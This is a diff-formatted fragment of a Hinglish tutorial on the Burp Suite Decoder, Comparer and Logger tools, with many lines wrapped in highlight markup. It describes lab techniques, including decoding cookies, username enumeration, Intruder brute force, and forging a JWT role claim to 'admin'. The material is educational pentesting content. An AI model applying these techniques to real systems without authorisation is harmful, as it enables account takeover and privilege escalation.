+- [[HL::Kabhi **URL encoded** hota hai (jaise space %20 ban jata hai::HL]])
+- [[HL::Kabhi **HTML entities** mein badal jaata hai (jaise < > symbols)::HL]]
 
-**Decoder ka kaam:** Kisi bi encoded data ko original form mein convert karna aur original data ko encoded form mein convert karna.
+[[HL::**Decoder ka kaam:** Kisi bi encoded data ko original form mein convert karna aur original data ko encoded form mein convert karna.::HL]]
 
-Jaise tumhara dost "hfofu" likh ke bhejta hai, tum decoder mein daal ke original "sense" nikalte ho.
+[[HL::Jaise tumhara dost "hfofu" likh ke bhejta hai, tum decoder mein daal ke original "sense" nikalte ho::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer):
 
-**Standard Definition:** "Decoder is a Burp Suite utility tool that enables security testers to decode/encode data in various formats including Base64, URL, HTML, ASCII hex, and various hash algorithms, facilitating the analysis of encoded data during penetration testing."
+[[HL::**Standard Definition:** "Decoder is a Burp Suite utility tool that enables security testers to decode/encode data in various formats including Base64, URL, HTML, ASCII hex, and various hash algorithms, facilitating the analysis of encoded data during penetration testing::HL]]."
 
-**Breakdown (Hinglish mein):**
-- **Encode:** Data ko ek specific format mein badalna (jaise hindi ko english mein translate karna)
-- **Decode:** Encoded data ko wapas original form mein laana (jaise english translation ko wapas hindi mein)
-- **Base64:** Binary data (images, files) ko text mein convert karne ka tarika
-- **URL Encoding:** Special characters ko % ke saath represent karna (space = %20)
-- **Hash:** Ek-way encryption - encode to kar sakte ho, wapas decode nahi kar sakte (jaise aam ka juice - aam se juice bana sakte ho, juice se aam nahi)
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**Encode:** Data ko ek specific format mein badalna (jaise hindi ko english mein translate karna)::HL]]
+- [[HL::**Decode:** Encoded data ko wapas original form mein laana (jaise english translation ko wapas hindi mein)::HL]]
+- [[HL::**Base64:** Binary data (images, files) ko text mein convert karne ka tarika::HL]]
+- [[HL::**URL Encoding:** Special characters ko % ke saath represent karna (space = %20)::HL]]
+- [[HL::**Hash:** Ek-way encryption - encode to kar sakte ho, wapas decode nahi kar sakte (jaise aam ka juice - aam se juice bana sakte ho, juice se aam nahi::HL]])
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Decoder):**
-Maano tum ek request intercept kar rahe ho:
+**[[HL::Problem (Without Decoder)::HL]]:**
+[[HL::Maano tum ek request intercept kar rahe ho:::HL]]
 ```http
-POST /login HTTP/1.1
-Cookie: session=dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2
+[[HL::POST /login HTTP/1.1::HL]]
+[[HL::Cookie: session=dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2::HL]]
 ```
-Cookie ki value `dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2` dikhti hai. Ye kya hai? Kaise samjhe?
+[[HL::Cookie ki value `dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2` dikhti hai. Ye kya hai? Kaise samjhe?::HL]]
 
-**Solution (With Decoder):**
-Decoder mein ye value daalo, Base64 decode karo:
+**[[HL::Solution (With Decoder)::HL]]:**
+[[HL::Decoder mein ye value daalo, Base64 decode karo:::HL]]
 ```text
-Input: dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2
-Decode (Base64) → username=admin;password=123456
+[[HL::Input: dXNlcm5hbWU9YWRtaW47cGFzc3dvcmQ9MTIzNDU2::HL]]
+[[HL::Decode (Base64) → username=admin;password=123456::HL]]
 ```
 Ab pata chala ki cookie mein username-password plain text mein stored hai! Ye vulnerability hai.
 
-**Dusra example:**
-URL mein `https://example.com/search?q=burp%20suite%20tutorial` dikhe. %20 kya hai? Decoder bataega ki %20 = space character. Iska matlab user "burp suite tutorial" search kar raha tha.
+**[[HL::Dusra example::HL]]:**
+[[HL::URL mein `https://example.com/search?q=burp%20suite%20tutorial` dikhe. %20 kya hai? Decoder bataega ki %20 = space character. Iska matlab user "burp suite tutorial" search kar raha tha::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
@@ -5155,11 +5155,11 @@ Step 5: Output display
 2. Left side box mein ye value PASTE karo: YWRtaW46MTIzNDU2
 ```
 
-**Step 3: Decode karo**
+[[HL::**Step 3: Decode karo**::HL]]
 ```text
-1. Neeche "Decode as" button ke saath dropdown hai.
-2. Dropdown mein "Base64" select karo.
-3. "Decode as" button par CLICK karo.
+1. [[HL::Neeche "Decode as" button ke saath dropdown hai.::HL]]
+2. [[HL::Dropdown mein "Base64" select karo.::HL]]
+3. [[HL::"Decode as" button par CLICK karo::HL]].
 ```
 
 **Expected Output (Right side):**
@@ -5220,26 +5220,26 @@ Hello%20World
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
 
-**Confusion 1: "Log sochte hain ki Base64 encryption hai."**
-- **Actually:** Base64 encoding hai, encryption nahi. Encryption ke liye key hoti hai, Base64 mein koi key nahi. Koi bhi decode kar sakta hai. Secret data ke liye Base64 use mat karo!
+[[HL::**Confusion 1: "Log sochte hain ki Base64 encryption hai."**::HL]]
+- [[HL::**Actually:** Base64 encoding hai, encryption nahi. Encryption ke liye key hoti hai, Base64 mein koi key nahi. Koi bhi decode kar sakta hai. Secret data ke liye Base64 use mat karo::HL]]!
 
-**Confusion 2: "Hash aur encoding mein kya difference?"**
-- **Actually:** Encoding reversible hai (jaise ZIP file - unzip kar sakte ho). Hash irreversible hai (jaise aam ka juice - wapas aam nahi bana sakte). Hash sirf verify karne ke liye use hota hai.
+[[HL::**Confusion 2: "Hash aur encoding mein kya difference?"**::HL]]
+- [[HL::**Actually:** Encoding reversible hai (jaise ZIP file - unzip kar sakte ho). Hash irreversible hai (jaise aam ka juice - wapas aam nahi bana sakte). Hash sirf verify karne ke liye use hota hai::HL]].
 
 **Confusion 3: "Smart decode se kaam chal jayega?"**
 - **Actually:** Smart decode helpful hai but 100% accurate nahi. Kabhi galat format detect kar leta hai. Better hai manually specify karo.
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 
-**Scenario:** Ek e-commerce site ki API test kar rahe the. Request mein ek parameter tha:
-`token=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lK`
+[[HL::**Scenario:** Ek e-commerce site ki API test kar rahe the. Request mein ek parameter tha:::HL]]
+[[HL::`token=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lK`::HL]]
 
-**How they used Decoder:**
-1. Base64 decode kiya → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ij`
-2. Phir ye JWT (JSON Web Token) nikla - phir se Base64 decode kiya
-3. Final result: `{"alg":"HS256","typ":"JWT"}.{"id":"123","role":"user","exp":1700000000}`
+**[[HL::How they used Decoder::HL]]:**
+1. [[HL::Base64 decode kiya → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ij`::HL]]
+2. [[HL::Phir ye JWT (JSON Web Token) nikla - phir se Base64 decode kiya::HL]]
+3. [[HL::Final result: `{"alg":"HS256","typ":"JWT"}.{"id":"123","role":"user","exp":1700000000}`::HL]]
 
-**Result:** Researcher ne "role":"user" dekha. Token modify karke "admin" banaya, phir se encode kiya aur request bheji - server ne accept kar liya! **$3,500 bounty** - privilege escalation vulnerability.
+[[HL::**Result:** Researcher ne "role":"user" dekha. Token modify karke "admin" banaya, phir se encode kiya aur request bheji - server ne accept kar liya! **$3,500 bounty** - privilege escalation vulnerability::HL]].
 
 ## 🎨 12. Visual Diagram (ASCII Art):
 
@@ -5267,11 +5267,11 @@ Hello%20World
 
 ## 🛠️ 13. Best Practices (Pro Tips):
 
-**Tip 1: Multiple Encodings Check Karo**
-- Kabhi data multiple times encoded hota hai. Ek baar decode karke phir dekho - phir bhi encoded lage? Dobara decode karo.
+[[HL::**Tip 1: Multiple Encodings Check Karo**::HL]]
+- [[HL::Kabhi data multiple times encoded hota hai. Ek baar decode karke phir dekho - phir bhi encoded lage? Dobara decode karo::HL]].
 
-**Tip 2: Hash Cracking ke liye Use Karo**
-- Agar hash mile (MD5, SHA1), to Decoder mein hash option se calculate karke compare kar sakte ho. Google bhi kar sakte ho - "md5 hash lookup".
+[[HL::**Tip 2: Hash Cracking ke liye Use Karo**::HL]]
+- [[HL::Agar hash mile (MD5, SHA1), to Decoder mein hash option se calculate karke compare kar sakte ho. Google bhi kar sakte ho - "md5 hash lookup::HL]]".
 
 **Tip 3: Smart Decode pe Depend Mat Karo**
 - Smart decode shortcut hai, lekin manually format specify karna zyada reliable hai.
@@ -5295,11 +5295,11 @@ Hello%20World
 **Q1: Base64 kya hai? Kab use hota hai?**
 **A1:** Binary data (images, files) ko text mein convert karne ka tarika. Email attachments, JWT tokens, cookies mein use hota hai.
 
-**Q2: URL encoding kyun zaroori hai?**
-**A2:** Kyunki URL mein special characters (space, /, ?, &) ka special meaning hota hai. Unhe safe form mein represent karne ke liye %20, %2F use karte hain.
+[[HL::**Q2: URL encoding kyun zaroori hai?**::HL]]
+[[HL::**A2:** Kyunki URL mein special characters (space, /, ?, &) ka special meaning hota hai. Unhe safe form mein represent karne ke liye %20, %2F use karte hain::HL]].
 
-**Q3: Hash aur encryption mein kya difference?**
-**A3:** Encryption reversible hai (decrypt kar sakte ho), hash irreversible hai. Hash data integrity check ke liye, encryption confidentiality ke liye.
+[[HL::**Q3: Hash aur encryption mein kya difference?**::HL]]
+[[HL::**A3:** Encryption reversible hai (decrypt kar sakte ho), hash irreversible hai. Hash data integrity check ke liye, encryption confidentiality ke liye::HL]].
 
 **Q4: Smart decode feature kya karta hai?**
 **A4:** Burp automatically detect karta hai ki input kaunsa encoding format hai aur decode kar deta hai. Multiple encodings handle kar leta hai.
@@ -5319,44 +5319,44 @@ Hello%20World
 
 Socho tumhare paas do **10th class ke exam papers** hain - ek topper ka, ek fail student ka. Tum dono papers mein difference dekhna chahte ho ki kahan se topper ne zyada marks liye. Tum dono papers side-by-side rakh kar compare karoge - "Yahan topper ne extra point likha, yahan fail student ne galat likha".
 
-**Comparer bilkul yahi kaam karta hai:**
+**[[HL::Comparer bilkul yahi kaam karta hai::HL]]:**
 
-Web applications mein kabhi kabhi do requests ya responses thode se different hote hain, aur woh thoda sa difference **vulnerability** ho sakta hai.
+[[HL::Web applications mein kabhi kabhi do requests ya responses thode se different hote hain, aur woh thoda sa difference **vulnerability** ho sakta hai.::HL]]
 
-**Examples:**
-- Ek request mein "admin" user ke liye response aaya "Welcome admin"
-- Dusri request mein "admi" user ke liye response aaya "User not found"
-- Comparer dono responses compare karega aur exact difference dikhayega - jisse pata chalega ki kaunsa username exist karta hai.
+**[[HL::Examples::HL]]:**
+- [[HL::Ek request mein "admin" user ke liye response aaya "Welcome admin"::HL]]
+- [[HL::Dusri request mein "admi" user ke liye response aaya "User not found"::HL]]
+- [[HL::Comparer dono responses compare karega aur exact difference dikhayega - jisse pata chalega ki kaunsa username exist karta hai::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer):
 
-**Standard Definition:** "Comparer is a Burp Suite utility tool that allows testers to visually compare two or more HTTP requests or responses at both word level and byte level, helping identify subtle differences that may indicate vulnerabilities."
+[[HL::**Standard Definition:** "Comparer is a Burp Suite utility tool that allows testers to visually compare two or more HTTP requests or responses at both word level and byte level, helping identify subtle differences that may indicate vulnerabilities."::HL]]
 
-**Breakdown (Hinglish mein):**
-- **Word level:** Text ka comparison - kaunse words alag hain, kaunse same hain
-- **Byte level:** Binary comparison - har byte (character) ko compare karna
-- **Visual diff:** Different parts ko alag color mein dikhana (jaise red mein change, green mein same)
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**Word level:** Text ka comparison - kaunse words alag hain, kaunse same hain::HL]]
+- [[HL::**Byte level:** Binary comparison - har byte (character) ko compare karna::HL]]
+- [[HL::**Visual diff:** Different parts ko alag color mein dikhana (jaise red mein change, green mein same::HL]])
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Comparer):**
-Maano tum **Username Enumeration** kar rahe ho - check kar rahe ho ki kaunse usernames exist karte hain.
+**[[HL::Problem (Without Comparer)::HL]]:**
+[[HL::Maano tum **Username Enumeration** kar rahe ho - check kar rahe ho ki kaunse usernames exist karte hain.::HL]]
 
-Request 1: `username=admin` → Response: "Invalid password" (200 OK)
-Request 2: `username=admi` → Response: "Invalid username" (404 Not Found)
+[[HL::Request 1: `username=admin` → Response: "Invalid password" (200 OK)::HL]]
+[[HL::Request 2: `username=admi` → Response: "Invalid username" (404 Not Found::HL]])
 
-Dono responses alag hain - ek mein "Invalid password" likha, ek mein "Invalid username". Isse pata chal gaya ki "admin" exist karta hai (kyunki password wrong bola, username wrong nahi bola).
+[[HL::Dono responses alag hain - ek mein "Invalid password" likha, ek mein "Invalid username". Isse pata chal gaya ki "admin" exist karta hai (kyunki password wrong bola, username wrong nahi bola::HL]]).
 
-**Problem:** Agar responses 1000 lines ke hain? Manually compare karna impossible hai. Aankhon se dekho to "Invalid password" aur "Invalid username" dono mein sirf 2 words ka difference hai, par manually dhundhna mushkil.
+[[HL::**Problem:** Agar responses 1000 lines ke hain? Manually compare karna impossible hai. Aankhon se dekho to "Invalid password" aur "Invalid username" dono mein sirf 2 words ka difference hai, par manually dhundhna mushkil::HL]].
 
-**Solution (With Comparer):**
-Comparer dono responses side-by-side dikhayega aur highlight karega:
-- Jo same hai wo gray mein
-- Jo different hai wo red/blue mein
-- Exact words dikh jayenge jo change hue hain
+**[[HL::Solution (With Comparer)::HL]]:**
+[[HL::Comparer dono responses side-by-side dikhayega aur highlight karega:::HL]]
+- [[HL::Jo same hai wo gray mein::HL]]
+- [[HL::Jo different hai wo red/blue mein::HL]]
+- [[HL::Exact words dikh jayenge jo change hue hain::HL]]
 
-**Dusra use case:**
-Session hijacking test - ek baar login karo, response aaya. Dobara same credentials se login karo, response aaya. Dono responses compare karo - agar session ID same hai, toh vulnerability (session fixation).
+**[[HL::Dusra use case::HL]]:**
+[[HL::Session hijacking test - ek baar login karo, response aaya. Dobara same credentials se login karo, response aaya. Dono responses compare karo - agar session ID same hai, toh vulnerability (session fixation::HL]]).
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
@@ -5435,50 +5435,50 @@ Comparison:
 
 **Step 1: Do requests capture karo**
 ```text
-1. Burp Proxy mein "Intercept" on karo.
-2. Browser mein DVWA open karo → Brute Force page.
-3. Username: "admin", Password: "anything" daal kar login karo.
-4. Request intercept karo → RIGHT-CLICK → "Send to Comparer".
-5. Phir username: "admi", Password: "anything" daal kar login karo.
-6. Dusri request intercept karo → RIGHT-CLICK → "Send to Comparer".
+1. [[HL::Burp Proxy mein "Intercept" on karo.::HL]]
+2. [[HL::Browser mein DVWA open karo → Brute Force page.::HL]]
+3. [[HL::Username: "admin", Password: "anything" daal kar login karo.::HL]]
+4. [[HL::Request intercept karo → RIGHT-CLICK → "Send to Comparer".::HL]]
+5. [[HL::Phir username: "admi", Password: "anything" daal kar login karo.::HL]]
+6. [[HL::Dusri request intercept karo → RIGHT-CLICK → "Send to Comparer::HL]]".
 ```
 
-**Step 2: Comparer mein jao**
+[[HL::**Step 2: Comparer mein jao**::HL]]
 ```text
-1. Top menu mein "Comparer" tab par CLICK karo.
-2. Items list mein 2 requests dikhengi (ya responses).
+1. [[HL::Top menu mein "Comparer" tab par CLICK karo.::HL]]
+2. [[HL::Items list mein 2 requests dikhengi (ya responses).::HL]]
 ```
 
-**Step 3: Items select karo**
+[[HL::**Step 3: Items select karo**::HL]]
 ```text
-1. Pehle item par CLICK karo (select ho jayega - highlight).
-2. CTRL key press karo aur dusre item par CLICK karo.
-   (Ya Shift + Click for range selection)
+1. [[HL::Pehle item par CLICK karo (select ho jayega - highlight).::HL]]
+2. [[HL::CTRL key press karo aur dusre item par CLICK karo.::HL]]
+   [[HL::(Ya Shift + Click for range selection::HL]])
 ```
 
-**Step 4: Compare karo**
+[[HL::**Step 4: Compare karo**::HL]]
 ```text
-1. Neeche "Compare" button par CLICK karo.
-2. Ek naya window khulega - "Comparer - Comparison Results".
+1. [[HL::Neeche "Compare" button par CLICK karo.::HL]]
+2. [[HL::Ek naya window khulega - "Comparer - Comparison Results".::HL]]
 ```
 
-**Screen par kya dikhega:**
+**[[HL::Screen par kya dikhega::HL]]:**
 ```text
-Left Side (Item 1):               Right Side (Item 2):
-username=admin                     username=admi
-password=anything                   password=anything
+[[HL::Left Side (Item 1):               Right Side (Item 2):::HL]]
+[[HL::username=admin                     username=admi::HL]]
+[[HL::password=anything                   password=anything::HL]]
 
-[Response Body]                    [Response Body]
-Username and password              Username and password
-[RED]incorrect[BLACK].              [BLUE]don't exist[BLACK].
+[[HL::[Response Body]                    [Response Body]::HL]]
+[[HL::Username and password              Username and password::HL]]
+[[HL::[RED]incorrect[BLACK].              [BLUE]don't exist[BLACK].::HL]]
 ```
-**Matlab:** Response different hai - ek mein "incorrect" likha, ek mein "don't exist". Iska matlab "admin" username exist karta hai (kyunki password incorrect bola, username exist nahi bolna chahiye tha to).
+[[HL::**Matlab:** Response different hai - ek mein "incorrect" likha, ek mein "don't exist". Iska matlab "admin" username exist karta hai (kyunki password incorrect bola, username exist nahi bolna chahiye tha to).::HL]]
 
-**Step 5: View modes change karo**
+[[HL::**Step 5: View modes change karo**::HL]]
 ```text
-1. Neeche "Word View" tab hai - isme readable text dikhta hai.
-2. "Byte View" tab par click karo - binary format dikhega.
-   Byte View mein hexadecimal mein data dikhta hai - jab exact byte-level difference dekhna ho tab use karo.
+1. [[HL::Neeche "Word View" tab hai - isme readable text dikhta hai.::HL]]
+2. [[HL::"Byte View" tab par click karo - binary format dikhega.::HL]]
+   [[HL::Byte View mein hexadecimal mein data dikhta hai - jab exact byte-level difference dekhna ho tab use karo::HL]].
 ```
 
 ## ⚖️ 8. Comparison (Comparer vs Manual Check):
@@ -5494,8 +5494,8 @@ Username and password              Username and password
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
 
-- **Mistake 1:** Sirf requests compare karna, responses nahi.
-  - **Fix:** Response compare karo - wahi actual output hai jo matter karta hai. Request mein sirf parameters change hote hain.
+- [[HL::**Mistake 1:** Sirf requests compare karna, responses nahi.::HL]]
+  - [[HL::**Fix:** Response compare karo - wahi actual output hai jo matter karta hai. Request mein sirf parameters change hote hain::HL]].
 
 - **Mistake 2:** Word view mein difference dikh raha hai par ignore kar dena.
   - **Fix:** Har difference potentially vulnerability hai. "Invalid password" vs "Invalid username" → Username enumeration!
@@ -5612,72 +5612,72 @@ Difference - ek mein extra carriage return tha!
 
 Socho tum ek **CCTV camera** lagate ho apne ghar ke bahar. Saare visitors record ho jate hain - kaun aaya, kab aaya, kitni der ruka, kya kiya. Baad mein agar kuch problem hoti hai toh CCTV footage dekh kar pata laga lete ho ki kisne kya kiya.
 
-**Logger bilkul yahi kaam karta hai:**
+**[[HL::Logger bilkul yahi kaam karta hai::HL]]:**
 
-Burp Suite jo bhi **HTTP traffic generate karta hai** - chahe wo Proxy se ho, Intruder se, Repeater se, Scanner se - sab kuch **Logger** mein automatically record ho jata hai.
+[[HL::Burp Suite jo bhi **HTTP traffic generate karta hai** - chahe wo Proxy se ho, Intruder se, Repeater se, Scanner se - sab kuch **Logger** mein automatically record ho jata hai::HL]].
 
-**Kyun use karte hain?**
-- Kabhi koi request/intercept karna bhool gaye? Logger mein mil jayegi.
-- Intruder ne 1000 requests bheji, koi specific request dhundhni hai? Logger mein filter laga ke dhundho.
-- Pentest ke baad report banana hai? Saari history Logger mein available hai.
+[[HL::**Kyun use karte hain?**::HL]]
+- [[HL::Kabhi koi request/intercept karna bhool gaye? Logger mein mil jayegi.::HL]]
+- [[HL::Intruder ne 1000 requests bheji, koi specific request dhundhni hai? Logger mein filter laga ke dhundho.::HL]]
+- [[HL::Pentest ke baad report banana hai? Saari history Logger mein available hai::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer):
 
-**Standard Definition:** "Logger is a Burp Suite tool that automatically records all HTTP/HTTPS traffic generated by all Burp tools (Proxy, Intruder, Repeater, Scanner, etc.) in a centralized interface, allowing testers to review, filter, and analyze historical requests and responses."
+[[HL::**Standard Definition:** "Logger is a Burp Suite tool that automatically records all HTTP/HTTPS traffic generated by all Burp tools (Proxy, Intruder, Repeater, Scanner, etc.) in a centralized interface, allowing testers to review, filter, and analyze historical requests and responses."::HL]]
 
-**Breakdown (Hinglish mein):**
-- **Traffic:** Saari requests aur responses jo Burp se guzarti hain
-- **Centralized:** Ek hi jagah par sab kuch available
-- **Filter:** Specific requests dhundhne ki facility (URL, status code, tool, etc.)
-- **Historical:** Purani requests bhi saved rehti hain (jab tak Burp band na karo)
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**Traffic:** Saari requests aur responses jo Burp se guzarti hain::HL]]
+- [[HL::**Centralized:** Ek hi jagah par sab kuch available::HL]]
+- [[HL::**Filter:** Specific requests dhundhne ki facility (URL, status code, tool, etc.)::HL]]
+- [[HL::**Historical:** Purani requests bhi saved rehti hain (jab tak Burp band na karo::HL]])
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Logger):**
-Maano tum Intruder se 5000 requests bhej rahe ho brute force attack ke liye. Beech mein ek interesting response aaya - status code 200 with "Welcome admin". Tumne dekha, lekin phir agle 1000 requests mein wo response kho gaya. Ab pata nahi kaunsi request thi jisme admin mila.
+**[[HL::Problem (Without Logger)::HL]]:**
+[[HL::Maano tum Intruder se 5000 requests bhej rahe ho brute force attack ke liye. Beech mein ek interesting response aaya - status code 200 with "Welcome admin". Tumne dekha, lekin phir agle 1000 requests mein wo response kho gaya. Ab pata nahi kaunsi request thi jisme admin mila.::HL]]
 
-**Ya phir:**
-Proxy mein kuch requests intercept ki, Repeater mein kuch bheji, Scanner auto chala diya. Ab total kitni requests hui, kaun si successful rahi - koi idea nahi.
+**[[HL::Ya phir::HL]]:**
+[[HL::Proxy mein kuch requests intercept ki, Repeater mein kuch bheji, Scanner auto chala diya. Ab total kitni requests hui, kaun si successful rahi - koi idea nahi.::HL]]
 
-**Solution (With Logger):**
-Logger mein saari requests **automatically** save hoti hain:
-- Kaunsa tool bhej raha hai (Proxy, Intruder, Repeater)
-- Kaunsi URL hit hui
-- Kya status code aaya (200, 404, 500)
-- Response kitni bytes ka tha
-- Kab request hui (timestamp)
+**[[HL::Solution (With Logger)::HL]]:**
+[[HL::Logger mein saari requests **automatically** save hoti hain:::HL]]
+- [[HL::Kaunsa tool bhej raha hai (Proxy, Intruder, Repeater)::HL]]
+- [[HL::Kaunsi URL hit hui::HL]]
+- [[HL::Kya status code aaya (200, 404, 500)::HL]]
+- [[HL::Response kitni bytes ka tha::HL]]
+- [[HL::Kab request hui (timestamp)::HL]]
 
-Baad mein filter laga ke dhundh sakte ho - "Sirf wo requests dikhao jisme status code 200 aaya aur URL mein /admin ho".
+[[HL::Baad mein filter laga ke dhundh sakte ho - "Sirf wo requests dikhao jisme status code 200 aaya aur URL mein /admin ho::HL]]".
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
-**Location:** Burp Suite mein top menu mein **"Logger"** tab. (Ya kuch versions mein "Logger" alag tab hota hai, kuch mein "HTTP history" ke saath)
+[[HL::**Location:** Burp Suite mein top menu mein **"Logger"** tab. (Ya kuch versions mein "Logger" alag tab hota hai, kuch mein "HTTP history" ke saath)::HL]]
 
-**Jab Logger khulega:**
+**[[HL::Jab Logger khulega::HL]]:**
 ```
 +---------------------------------------------------------------------+
-| [Filter Bar]                                                        |
-| Filter by URL: [_________]  Status: [All]  Tool: [All]  Search: [ ]|
-+---------------------------------------------------------------------+
-| # | Tool    | URL                          | Status | Length | Time |
-|---|---------|-------------------------------|--------|--------|------|
-| 1 | Proxy   | GET /index.html               | 200    | 5432   | 10:01 |
-| 2 | Intruder| POST /login.php?user=admin    | 302    | 234    | 10:02 |
-| 3 | Intruder| POST /login.php?user=test     | 200    | 1245   | 10:02 |
-| 4 | Repeater| GET /admin/users               | 403    | 567    | 10:05 |
-| 5 | Scanner | GET /robots.txt                | 200    | 123    | 10:06 |
-+---------------------------------------------------------------------+
-| [Double-click any row to see full request/response]                |
+| [[[HL::Filter Bar]                                                        |::HL]]
+[[HL::| Filter by URL: [_________]  Status: [All]  Tool: [All]  Search: [ ]|::HL]]
+[[HL::+---------------------------------------------------------------------+::HL]]
+[[HL::| # | Tool    | URL                          | Status | Length | Time |::HL]]
+[[HL::|---|---------|-------------------------------|--------|--------|------|::HL]]
+[[HL::| 1 | Proxy   | GET /index.html               | 200    | 5432   | 10:01 |::HL]]
+[[HL::| 2 | Intruder| POST /login.php?user=admin    | 302    | 234    | 10:02 |::HL]]
+[[HL::| 3 | Intruder| POST /login.php?user=test     | 200    | 1245   | 10:02 |::HL]]
+[[HL::| 4 | Repeater| GET /admin/users               | 403    | 567    | 10:05 |::HL]]
+[[HL::| 5 | Scanner | GET /robots.txt                | 200    | 123    | 10:06 |::HL]]
+[[HL::+---------------------------------------------------------------------+::HL]]
+[[HL::| [Double-click any row to see full request/response::HL]]]                |
 +---------------------------------------------------------------------+
 ```
 
-**Columns:**
-- **#:** Request number
-- **Tool:** Kaunsa tool bhej raha hai (Proxy, Intruder, Repeater, Scanner, etc.)
-- **URL:** Kaunsi URL request ki gayi
-- **Status:** HTTP status code (200 OK, 404 Not Found, 500 Error)
-- **Length:** Response ki length (bytes mein)
-- **Time:** Kab request hui
+**[[HL::Columns::HL]]:**
+- [[HL::**#:** Request number::HL]]
+- [[HL::**Tool:** Kaunsa tool bhej raha hai (Proxy, Intruder, Repeater, Scanner, etc.)::HL]]
+- [[HL::**URL:** Kaunsi URL request ki gayi::HL]]
+- [[HL::**Status:** HTTP status code (200 OK, 404 Not Found, 500 Error)::HL]]
+- [[HL::**Length:** Response ki length (bytes mein)::HL]]
+- [[HL::**Time:** Kab request hui::HL]]
 
 ## ⚙️ 6. Under the Hood (Technical Working):
 
@@ -5714,109 +5714,109 @@ Step 6: User filter apply karta hai
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 
-**Step 1: Logger open karo**
+[[HL::**Step 1: Logger open karo**::HL]]
 ```text
-1. Burp Suite ke top menu mein "Logger" tab par CLICK karo.
-   (Agar "Logger" nahi dikhe, toh "View" menu mein jaa kar "Logger" enable karo)
+1. [[HL::Burp Suite ke top menu mein "Logger" tab par CLICK karo.::HL]]
+   [[HL::(Agar "Logger" nahi dikhe, toh "View" menu mein jaa kar "Logger" enable karo)::HL]]
 ```
 
-**Step 2: Traffic generate karo**
+[[HL::**Step 2: Traffic generate karo**::HL]]
 ```text
-1. Proxy tab mein jao → Intercept on karo.
-2. Browser mein koi website kholo (e.g., google.com).
-3. Request intercept karo → "Forward" karo.
-4. Ab Repeater mein kuch requests bhejo.
-5. Intruder bhi chala do agar time ho.
+1. [[HL::Proxy tab mein jao → Intercept on karo.::HL]]
+2. [[HL::Browser mein koi website kholo (e.g., google.com).::HL]]
+3. [[HL::Request intercept karo → "Forward" karo.::HL]]
+4. [[HL::Ab Repeater mein kuch requests bhejo.::HL]]
+5. [[HL::Intruder bhi chala do agar time ho.::HL]]
 ```
 
-**Step 3: Logger mein entries dekho**
+[[HL::**Step 3: Logger mein entries dekho**::HL]]
 ```text
-1. Logger tab par wapas jao.
-2. Table mein saari entries dikhengi - Proxy wali, Repeater wali, sab.
-3. Kisi bhi row par DOUBLE-CLICK karo.
+1. [[HL::Logger tab par wapas jao.::HL]]
+2. [[HL::Table mein saari entries dikhengi - Proxy wali, Repeater wali, sab.::HL]]
+3. [[HL::Kisi bhi row par DOUBLE-CLICK karo.::HL]]
 ```
 
-**Double-click karne par kya dikhega:**
+**[[HL::Double-click karne par kya dikhega::HL]]:**
 ```text
 +------------------------+------------------------+
-| [Request]              | [Response]             |
-| GET /index.html        | HTTP/1.1 200 OK        |
-| Host: example.com      | Content-Type: text/html|
-| User-Agent: Mozilla... |                        |
-|                        | <html>...              |
-+------------------------+------------------------+
+| [[[HL::Request]              | [Response]             |::HL]]
+[[HL::| GET /index.html        | HTTP/1.1 200 OK        |::HL]]
+[[HL::| Host: example.com      | Content-Type: text/html|::HL]]
+[[HL::| User-Agent: Mozilla... |                        |::HL]]
+[[HL::|                        | <html>...              |::HL]]
+[[HL::+------------------------+------------------------+::HL]]
 ```
-- Request aur response side-by-side dikhenge.
+- [[HL::Request aur response side-by-side dikhenge.::HL]]
 
-**Step 4: Filter apply karo**
+[[HL::**Step 4: Filter apply karo**::HL]]
 ```text
-1. Upar "Filter" bar mein "Tool" dropdown par CLICK karo.
-2. Sirf "Intruder" select karo.
-3. Table ab sirf Intruder ki requests dikhayega.
+1. [[HL::Upar "Filter" bar mein "Tool" dropdown par CLICK karo.::HL]]
+2. [[HL::Sirf "Intruder" select karo.::HL]]
+3. [[HL::Table ab sirf Intruder ki requests dikhayega.::HL]]
 ```
 
-**Step 5: Advanced filter**
+[[HL::**Step 5: Advanced filter**::HL]]
 ```text
-1. "Filter by URL" mein likho: "login"
-2. "Status" mein "200" select karo.
-3. Ab sirf wo Intruder requests dikhengi jisme URL mein "login" hai aur status 200 aaya.
+1. [[HL::"Filter by URL" mein likho: "login"::HL]]
+2. [[HL::"Status" mein "200" select karo.::HL]]
+3. [[HL::Ab sirf wo Intruder requests dikhengi jisme URL mein "login" hai aur status 200 aaya.::HL]]
 ```
 
-**Step 6: Search karo**
+[[HL::**Step 6: Search karo**::HL]]
 ```text
-1. "Search" box mein likho: "admin"
